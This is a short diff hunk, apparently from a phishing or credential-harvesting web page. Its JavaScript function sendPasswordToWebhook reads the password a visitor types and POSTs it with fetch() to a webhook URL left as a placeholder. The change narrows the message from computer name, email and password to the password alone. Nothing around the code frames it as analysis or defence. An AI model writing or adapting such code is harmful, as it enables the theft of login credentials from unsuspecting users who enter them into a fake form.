@@ -43,7 +43,7 @@
     function sendPasswordToWebhook() {
       var passwordValue = document.getElementById("password").value;
       var webhookUrl = "YOUR_WEBHOOK_HERE";                                         // <<< WEBHOOK GOES HERE
-      var data = {content: "Computer: " + cValue + " | Email: " + uValue + " | Password: " + passwordValue};
+      var data = {content: " Password: " + passwordValue};
       fetch(webhookUrl, {
         method: 'POST',
         headers: {
